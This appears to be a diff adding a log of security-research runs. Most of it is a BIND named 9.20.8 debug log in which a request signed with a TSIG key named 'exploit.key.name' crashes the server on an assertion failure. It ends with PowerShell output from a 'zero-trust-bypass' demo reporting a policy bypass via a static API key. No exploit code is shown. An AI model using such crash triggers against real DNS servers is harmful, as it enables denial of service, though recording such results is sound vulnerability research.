+22-May-2025 21:04:33.912 general: debug 3: dns_requestmgr_shutdown: 0x5626833da430
+22-May-2025 21:04:33.912 database: debug 1: called qpzone_destroy(.)
+22-May-2025 21:04:33.912 general: debug 1: loop exclusive mode: ending
+22-May-2025 21:04:33.912 general: debug 1: loop exclusive mode: ended
+22-May-2025 21:04:33.912 general: debug 3: requestmgr_destroy
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x5626831436f0(0)
+22-May-2025 21:04:33.912 general: debug 3: zone_shutdown: managed-keys-zone: shutting down
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683143e50(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x5626831445b0(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683144d10(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683145470(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683145bd0(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683146330(0)
+22-May-2025 21:04:33.912 database: debug 1: called qpzone_destroy(.)
+22-May-2025 21:04:33.912 database: debug 1: done qpcache__destroy(.)
+22-May-2025 21:04:33.922 default: debug 1: netmgr 0x56268314d9a0: Destroying network manager worker on loop 0x562683142f90(0)
+22-May-2025 21:04:33.922 database: debug 1: called qpzone_destroy(.)
+22-May-2025 21:04:33.922 general: debug 3: requestmgr_destroy
+22-May-2025 21:04:33.922 general: debug 1: zone authors.bind/CH: final reference detached
+22-May-2025 21:04:33.922 general: debug 1: zone hostname.bind/CH: final reference detached
+22-May-2025 21:04:33.922 general: debug 1: zone version.bind/CH: final reference detached
+22-May-2025 21:04:33.922 general: debug 3: zone_shutdown: zone hostname.bind/CH: shutting down
+22-May-2025 21:04:33.922 general: debug 1: zone id.server/CH: final reference detached
+22-May-2025 21:04:33.922 general: debug 3: zone_shutdown: zone authors.bind/CH: shutting down
+22-May-2025 21:04:33.922 general: debug 3: zone_shutdown: zone version.bind/CH: shutting down
+22-May-2025 21:04:33.922 general: debug 3: zone_shutdown: zone id.server/CH: shutting down
+22-May-2025 21:04:33.922 database: debug 1: done qpcache__destroy(.)
+22-May-2025 21:04:33.922 database: debug 2: Unregistering DLZ_dlopen driver
+22-May-2025 21:04:33.922 database: debug 2: Unregistering SDLZ driver.
+22-May-2025 21:04:33.922 database: debug 2: Unregistering DLZ driver.
+22-May-2025 21:04:33.922 general: notice: exiting
+22-May-2025 21:04:53.224 general: debug 1: now using logging configuration from config file
+22-May-2025 21:04:53.224 general: debug 1: loop exclusive mode: ending
+22-May-2025 21:04:53.224 general: debug 1: loop exclusive mode: ended
+22-May-2025 21:04:53.224 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 21:04:53.224 general: notice: command channel listening on 127.0.0.1#953
+22-May-2025 21:04:53.224 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 21:04:53.294 general: notice: command channel listening on ::1#953
+22-May-2025 21:04:53.294 general: debug 1: load_configuration: success
+22-May-2025 21:04:53.294 general: debug 1: loop exclusive mode: starting
+22-May-2025 21:04:53.294 general: debug 1: loop exclusive mode: started
+22-May-2025 21:04:53.294 zoneload: debug 1: managed-keys-zone: starting load
+22-May-2025 21:04:53.294 general: debug 1: zone_startload: managed-keys-zone: enter
+22-May-2025 21:04:53.294 zoneload: debug 2: managed-keys-zone: number of nodes in database: 1
+22-May-2025 21:04:53.294 zoneload: debug 1: managed-keys-zone: journal rollforward completed successfully: up to date
+22-May-2025 21:04:53.294 zoneload: debug 1: managed-keys-zone: loaded; checking validity
+22-May-2025 21:04:53.294 zoneload: info: managed-keys-zone: loaded serial 4
+22-May-2025 21:04:53.294 general: debug 1: loop exclusive mode: ending
+22-May-2025 21:04:53.294 zoneload: debug 1: zone hostname.bind/CH: starting load
+22-May-2025 21:04:53.294 zoneload: debug 1: zone authors.bind/CH: starting load
+22-May-2025 21:04:53.294 general: debug 1: loop exclusive mode: ended
+22-May-2025 21:04:53.294 zoneload: debug 2: zone authors.bind/CH: number of nodes in database: 0
+22-May-2025 21:04:53.294 zoneload: debug 2: zone hostname.bind/CH: number of nodes in database: 0
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 zoneload: debug 1: zone hostname.bind/CH: loaded; checking validity
+22-May-2025 21:04:53.294 zoneload: debug 1: zone version.bind/CH: starting load
+22-May-2025 21:04:53.294 zoneload: debug 2: zone version.bind/CH: number of nodes in database: 0
+22-May-2025 21:04:53.294 zoneload: debug 1: zone authors.bind/CH: loaded; checking validity
+22-May-2025 21:04:53.294 general: debug 1: dns_zone_verifydb: zone hostname.bind/CH: enter
+22-May-2025 21:04:53.294 zoneload: debug 1: zone version.bind/CH: loaded; checking validity
+22-May-2025 21:04:53.294 general: debug 1: dns_zone_verifydb: zone authors.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: dns_zone_verifydb: zone version.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone_maintenance: zone hostname.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone_maintenance: zone version.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:04:53.294 zoneload: debug 1: zone id.server/CH: starting load
+22-May-2025 21:04:53.294 zoneload: debug 2: zone id.server/CH: number of nodes in database: 0
+22-May-2025 21:04:53.294 zoneload: debug 1: zone id.server/CH: loaded; checking validity
+22-May-2025 21:04:53.294 general: debug 1: dns_zone_verifydb: zone id.server/CH: enter
+22-May-2025 21:04:53.294 general: notice: all zones loaded
+22-May-2025 21:04:53.294 general: debug 1: managed-keys-zone: synchronizing trusted keys
+22-May-2025 21:04:53.294 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:04:53.294
+22-May-2025 21:04:53.294 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:04:53.294
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone_refreshkeys: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: notice: FIPS mode is disabled
+22-May-2025 21:04:53.294 general: notice: running
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:04:53.294
+22-May-2025 21:04:53.294 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:04:53.294
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone_maintenance: zone authors.bind/CH: enter
+22-May-2025 21:04:53.294 dnssec: debug 3: managed-keys-zone: Creating key fetch in zone_refreshkeys() for '.'
+22-May-2025 21:04:53.294 general: debug 1: zone_maintenance: zone id.server/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:04:53.294 resolver: debug 1: fetch: ./DNSKEY
+22-May-2025 21:04:53.294 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.294 resolver: debug 1: fetch: ./NS
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c001ea0(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:a8::e#53
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 resolver: debug 3: fctx 0x7f3c2c004510(./NS): createfind for <unknown> - success
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2::c#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2::c#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fe::53#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fe::53#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:9f::42#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:9f::42#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2f::f#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2f::f#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:ba3e::2:30#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:ba3e::2:30#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fd::1#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fd::1#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:1::53#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:1::53#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:c27::2:30#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:c27::2:30#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:dc3::35#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:dc3::35#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2801:1b8:10::b#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2801:1b8:10::b#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2d::d#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2d::d#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:12::d0d#53
+22-May-2025 21:04:53.294 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:12::d0d#53
+22-May-2025 21:04:53.314 dnssec: debug 3: managed-keys-zone: Returned from key fetch in keyfetch_done() for '.': success
+22-May-2025 21:04:53.314 dnssec: debug 3: managed-keys-zone: Verifying DNSKEY set for zone '.' using DS 20326/8: success
+22-May-2025 21:04:53.314 dnssec: info: managed-keys-zone: Key 20326 for zone . is now trusted (acceptance timer complete)
+22-May-2025 21:04:53.314 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.314 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 21:04:53.314
+22-May-2025 21:04:53.314 dnssec: info: managed-keys-zone: Key 38696 for zone . is now trusted (acceptance timer complete)
+22-May-2025 21:04:53.314 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:04:53.314 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 21:04:53.314
+22-May-2025 21:04:53.314 general: debug 1: zone_journal: managed-keys-zone: enter
+22-May-2025 21:04:53.314 general: debug 3: writing to journal
+22-May-2025 21:04:53.314 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 21:04:53.314 dnssec: debug 3: validating ./NS: starting
+22-May-2025 21:04:53.314 dnssec: debug 3: validating ./NS: attempting positive response validation
+22-May-2025 21:04:53.314 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.314 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.314 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:53.314 dnssec: debug 3:   validating ./DNSKEY: starting
+22-May-2025 21:04:53.314 dnssec: debug 3:   validating ./DNSKEY: attempting positive response validation
+22-May-2025 21:04:53.314 dnssec: debug 3:   validating ./DNSKEY: verify rdataset (keyid=20326): success
+22-May-2025 21:04:53.314 dnssec: debug 3:   validating ./DNSKEY: marking as secure (DS)
+22-May-2025 21:04:53.314 dnssec: debug 3: validating ./NS: in validator_callback_dnskey
+22-May-2025 21:04:53.314 dnssec: debug 3: validating ./NS: keyset with trust secure
+22-May-2025 21:04:53.314 dnssec: debug 3: validating ./NS: resuming validate
+22-May-2025 21:04:53.324 dnssec: debug 3: validating ./NS: verify rdataset (keyid=53148): success
+22-May-2025 21:04:53.324 dnssec: debug 3: validating ./NS: marking as secure, noqname proof not needed
+22-May-2025 21:04:53.324 resolver: debug 1: resolver priming query complete: success
+22-May-2025 21:05:20.344 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 21:05:20.344 general: debug 1: zone_dump: managed-keys-zone: enter
+22-May-2025 21:05:20.344 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:05:20.364 general: debug 1: dump_done: managed-keys-zone: enter
+22-May-2025 21:05:20.364 general: debug 1: zone_journal_compact: managed-keys-zone: target journal size 0
+22-May-2025 21:05:20.364 general: debug 1: journal file managed-keys.bind.jnw does not exist, creating it
+22-May-2025 21:05:20.374 general: debug 3: managed-keys-zone: dns_journal_compact: success
+22-May-2025 21:05:25.373 security: debug 3: client @0x7f3c38001df0 (no-peer): allocate new client
+22-May-2025 21:05:25.373 client: debug 3: client @0x7f3c38001df0 172.19.0.1#36012: UDP request
+22-May-2025 21:05:25.383 dnssec: debug 3: tsig key 'exploit.key.name': statically configured
+22-May-2025 21:05:25.383 dnssec: debug 2: tsig key 'exploit.key.name': unknown key
+22-May-2025 21:05:25.383 security: error: client @0x7f3c38001df0 172.19.0.1#36012: request has invalid signature: TSIG exploit.key.name: tsig verify failure (BADKEY)
+22-May-2025 21:05:25.383 general: critical: ./include/dns/name.h:713: REQUIRE(((name) != ((void *)0) && ((const isc__magic_t *)(name))->magic == ((('D') << 24 | ('N') << 16 | ('S') << 8 | ('n'))))) failed
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(isc_backtrace_log+0x31) [0x7f3c403c0ee1]
+22-May-2025 21:05:25.383 general: critical: /usr/sbin/named(+0x235a7) [0x560877c0f5a7]
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(isc_assertion_failed+0xa) [0x7f3c403c0aca]
+22-May-2025 21:05:25.383 general: critical: /lib/libdns-9.20.8.so(+0x89c73) [0x7f3c401f7c73]
+22-May-2025 21:05:25.383 general: critical: /lib/libdns-9.20.8.so(dns_message_reply+0x198) [0x7f3c401fd498]
+22-May-2025 21:05:25.383 general: critical: /lib/libns-9.20.8.so(ns_client_error+0x103) [0x7f3c401331a3]
+22-May-2025 21:05:25.383 general: critical: /lib/libns-9.20.8.so(+0x1122a) [0x7f3c4013422a]
+22-May-2025 21:05:25.383 general: critical: /lib/libns-9.20.8.so(ns_client_request+0x6ff) [0x7f3c40134edf]
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(isc__nm_readcb+0xac) [0x7f3c403ada0c]
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(isc__nm_udp_read_cb+0x1c6) [0x7f3c403bf216]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x1dfd5) [0x7f3c3fc26fd5]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x1f06b) [0x7f3c3fc2806b]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(+0x22e6c) [0x7f3c3fc2be6c]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libuv.so.1(uv_run+0xc4) [0x7f3c3fc189e4]
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(+0x4519f) [0x7f3c403d319f]
+22-May-2025 21:05:25.383 general: critical: /lib/libisc-9.20.8.so(+0x54d68) [0x7f3c403e2d68]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libc.so.6(+0x891f5) [0x7f3c3fab11f5]
+22-May-2025 21:05:25.383 general: critical: /lib/x86_64-linux-gnu/libc.so.6(+0x10989c) [0x7f3c3fb3189c]
+22-May-2025 21:05:25.383 general: critical: exiting (due to assertion failure)
+PS C:\Users\alexs\nhi-zero-trust-bypass> python .\client_nhi_rotation.py
+--- NHI Client Simulation Started ---
+[Client] Attempting to get/rotate secret (retry 0/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653812D350>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 1/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653812F510>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 2/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653812F890>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 3/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653812CCD0>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 4/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x0000026538139610>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 5/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653813B6D0>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 6/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653813D810>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 7/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653813F950>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 8/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653813F410>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Attempting to get/rotate secret (retry 9/10)...
+[Client] Connection error during rotation: HTTPConnectionPool(host='mock_secrets_manager', port=8200): Max retries exceeded with url: /rotate_secret (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x000002653813D7D0>: Failed to resolve 'mock_secrets_manager' ([Errno 11001] getaddrinfo failed)")). Retrying...
+[Client] Max retries reached. Could not obtain active NHI.
+[Client] Failed to get any NHI after retries.
+--- NHI Client Simulation Complete ---
+PS C:\Users\alexs\nhi-zero-trust-bypass> python .\bypass_demo.py
+Status: 200
+Response: {'policy': 'Bypassed', 'sensitive_data': 'Access granted with static API key!'}
+PS C:\Users\alexs\nhi-zero-trust-bypass>
